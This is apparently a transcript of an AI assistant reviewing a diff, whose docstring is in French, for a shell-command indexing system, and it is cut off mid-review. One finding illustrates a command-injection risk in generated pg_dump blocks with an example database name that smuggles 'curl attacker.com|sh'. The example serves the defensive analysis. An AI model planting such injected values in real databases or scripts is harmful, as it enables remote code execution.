[user] Review this change for security vulnerabilities.

Changed files (you may Read these and any other file in the repo):
  - bin/biblio-classify.py
  - bin/biblio-doctor.py
  - bin/biblio-ingest-sql.sh
  - bin/biblio-porte-qualite.sh
  - bin/bloc.sh
  - bin/injecter-file-nuit.py
  - bin/injecter-taches-nuit.py
  - bin/jarvis-producer.py
  - cli/biblio_cycle.py
  - scripts/biblio-health-check.sh

Unified diff (only + lines are new):

=== DIFF: bin/biblio-classify.py ===
@@ -0,0 +1,349 @@
+#!/usr/bin/env python3
+"""biblio-classify.py — attribue un TYPE à chaque bloc de la bibliothèque.
+
+Pourquoi : ~80 % de BLOCS-INDEX.tsv n'est pas exécutable (chemins nus, rapports,
+commentaires, pointeurs vers un agent). Un simple malus de score dans bloc.sh ne
+suffit pas à sortir une vraie commande en tête — il faut pouvoir FILTRER.
+
+Sortie : BLOCS-KIND.tsv  (nom<TAB>source<TAB>kind).  L'index n'est pas modifié.
+
+kind :
+  exec      commande réellement exécutable telle quelle (binaire de tête installé,
+            aucun placeholder à substituer)
+  template  exige une substitution avant de tourner ([trous:], <var>, {var}…)
+  pointeur  désigne une ressource au lieu d'agir (agent …, Skill:, chaîne:,
+            xdg-open, gh api / gh repo clone, Agent tool subagent_type=…)
+  doc       chemin nu vers un fichier, ou prose sans verbe outil
+  noop      commence par #
+
+Perf : le test « ce binaire existe-t-il ? » est fait UNE fois par tête distincte
+(quelques milliers) puis réduit à une a

[assistant] Looking at this diff, I need to analyze the security surface of a personal "living library" system that indexes and routes shell command blocks.

[assistant] Now I have enough context. The `jarvis-executor.py` does NOT directly `exec` the `cmd` from the queue — it routes through dominos/canal/LLM, so injected queue commands aren't a direct sink. Let me focus on the actual attack surfaces I identified.

Reviewing my findings against strict criteria:

1. **`emit_postgres` / `emit_sqlite` in biblio-ingest-sql.sh** — DB names / table names come from `docker exec psql` output and `sqlite3 .tables`, and are interpolated raw (no quoting) into generated shell blocks (`pg_dump -U user DBNAME | gzip > ~/jarvis/backups/DBNAME_$(date +%Y%m%d).sql.gz`). If any Postgres cluster contains a database named e.g. `"foo;curl attacker.com|sh;#"`, the block ends up in `BLOCS-INDEX.tsv`, and any user later selecting it via `bloc.sh` and copy-executing would run the injection. Also the `-dump` block uses unescaped `$(date +...)` inside the printf's target path, but that's an intentional literal. The DB-name injection is the real issue.

2. **`biblio-porte-qualite.sh`** — I initially worried about `bash -n <<< "$bloc"`, but `bash -n` is parse-only and does not execute command substitutions, so this is safe. The `tete()` function does `for w in $b` (unquoted), causing word-splitting + globbing on bloc content — but the extracted token only feeds `command -v "$w"` (quoted). No exploit path.

3. **`bloc.sh`** — user query `$q` goes through `awk -v q="$q"` (safe). The `BINS` computation runs `command -v -- "$h"` where `$h` is regex-filtered to `[A-Za-z0-9_.+/